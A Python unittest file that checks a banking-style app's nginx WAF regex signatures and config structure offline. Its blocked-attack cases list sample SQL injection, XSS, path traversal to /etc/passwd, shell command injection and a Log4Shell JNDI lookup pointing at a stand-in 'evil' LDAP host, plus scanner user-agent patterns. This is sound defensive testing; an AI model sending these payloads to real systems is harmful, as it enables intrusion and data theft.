"""Valide les signatures du WAF nginx SANS nginx : on extrait les expressions de waf/nginx.conf et on les rejoue avec `re`
(les motifs n'utilisent que de la syntaxe commune à PCRE et à Python).  Vérifie aussi la cohérence de rules/active.conf.
Lancer (depuis la racine du dépôt) :  python3 -I -m unittest discover -s tests -v"""
import re, sys, unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
CONF = (ROOT / "waf" / "nginx.conf").read_text()
LINE = re.compile(r'^\s*"~(\*?)(.+)"\s+(\w+);\s*$')


def load_map(name):
    block = re.search(r"map \$\w+ \$%s \{(.*?)\n\}" % name, CONF, re.S).group(1)
    out = []
    for ln in block.splitlines():
        m = LINE.match(ln)
        if m:
            out.append((re.compile(m.group(2), re.I if m.group(1) else 0), m.group(3)))
    return out


URI, UA = load_map("waf_sig"), load_map("waf_ua")


def sig(uri):
    for rx, name in URI:
        if rx.search(uri):
            return name
    return ""


class Signatures(unittest.TestCase):
    def test_maps_loaded(self):
        self.assertGreaterEqual(len(URI), 12); self.assertEqual(len(UA), 1)

    def test_attacks_blocked(self):
        cases = {
            "/api/payments?to=bob%27%20OR%201=1--": "sqli",
            "/api/payments?id=1+UNION+SELECT+username,pw_hash+FROM+users": "sqli",
            "/api/payments?id=1 union/**/all select 1": "sqli",
            "/api/payments?q='%20or%20'a'='a": "sqli",
            "/api/payments?q=1;DROP%20TABLE%20users": "sqli",
            "/api/payments?q=1%20and%20sleep(5)": "sqli",
            "/api/beneficiaries?x=pg_sleep(3)": "sqli",
            "/api/x?q=information_schema.tables": "sqli",
            "/api/payments?label=<script>alert(1)</script>": "xss",
            "/api/payments?label=%3Cscript%3E": "xss",
            "/api/x?u=javascript:alert(1)": "xss",
            "/api/x?q=a%20onerror=alert(1)": "xss",
            "/static/../../etc/passwd": "traversal",
            "/api/x?f=..%2f..%2fsecret": "traversal",
            "/api/x?f=%2e%2e%2fsecret": "traversal",
            "/api/x?c=1;cat%20/etc/hosts": "cmdi",
            "/api/x?c=a|whoami;": "cmdi",
            "/api/x?q=${jndi:ldap://evil/a}": "cmdi",
        }
        for uri, fam in cases.items():
            self.assertEqual(sig(uri), fam, uri)

    def test_legitimate_requests_pass(self):
        for uri in ["/", "/index.html", "/assets/index-4f3a9c.js", "/auth/login", "/api/payments", "/api/payments?limit=20",
                    "/api/payments/8f3a1c2e-77aa-4b0c-9a55-0c9e0d3f1b22", "/api/accounts/me", "/api/beneficiaries",
                    "/api/payments?label=Loyer%20octobre", "/api/payments?label=caf%C3%A9%20d%27equipe",
                    "/api/payments?after=2026-10-19T10:00:00Z", "/api/health", "/waf-health",
                    "/face/verify", "/face/enroll", "/face/enrollments"]:
            self.assertEqual(sig(uri), "", uri)

    def test_scanner_user_agents(self):
        rx = UA[0][0]
        for ua in ("sqlmap/1.7.2#stable", "Nikto/2.5.0", "Mozilla/5.00 (Nikto/2.1.6)", "gobuster/3.6"):
            self.assertTrue(rx.search(ua), ua)
        for ua in ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0", "python-httpx/0.27.2", "curl/8.5.0", ""):
            self.assertFalse(rx.search(ua), ua)


class Structure(unittest.TestCase):
    def test_active_conf_matches_engine_defaults(self):
        sys.path.insert(0, str(ROOT / "remediator"))
        sys.dont_write_bytecode = True
        from app.engine import Config, Engine, render_waf_rules
        cfg = Config()
        expected = render_waf_rules({"banned_ips": [], "pay_rate": cfg.pay_default, "login_rate": cfg.login_default})
        self.assertEqual((ROOT / "waf" / "rules" / "active.conf").read_text(), expected)

    def test_rate_limit_key_is_defined_and_used(self):
        self.assertIn("map $http_authorization $rl_key", CONF)
        self.assertIn("$rl_key", (ROOT / "waf" / "rules" / "active.conf").read_text())

    def test_internal_endpoints_are_not_routed(self):
        self.assertIn("location = /api/health/deep { return 404; }", CONF)
        self.assertNotIn("/internal", CONF.replace("/internal-", ""))
        self.assertEqual(re.findall(r"proxy_pass \$(\w+);", CONF), ["auth", "face", "api", "web"])

    def test_braces_balanced(self):
        body = re.sub(r'"[^"\n]*"|\'[^\'\n]*\'', '""', re.sub(r"(?m)^\s*#.*$", "", CONF))
        depth = 0
        for ch in body:
            depth += ch == "{"; depth -= ch == "}"
            self.assertGreaterEqual(depth, 0)
        self.assertEqual(depth, 0)


if __name__ == "__main__":
    unittest.main()
